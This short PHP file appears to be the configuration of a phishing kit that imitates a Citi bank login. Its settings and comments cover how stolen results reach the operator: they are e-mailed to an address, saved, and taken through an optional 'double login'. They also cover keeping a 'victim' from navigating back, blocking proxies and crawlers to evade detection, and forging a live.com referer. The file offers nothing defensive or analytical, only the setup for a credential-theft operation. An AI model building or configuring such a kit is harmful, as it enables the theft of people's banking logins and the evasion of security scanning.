<?php



$settings = array(

	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"double_login"	=> "0", // double login

	"email"			=> "",	// Your E-Mail

	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "citi+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	
);
return $settings;



?>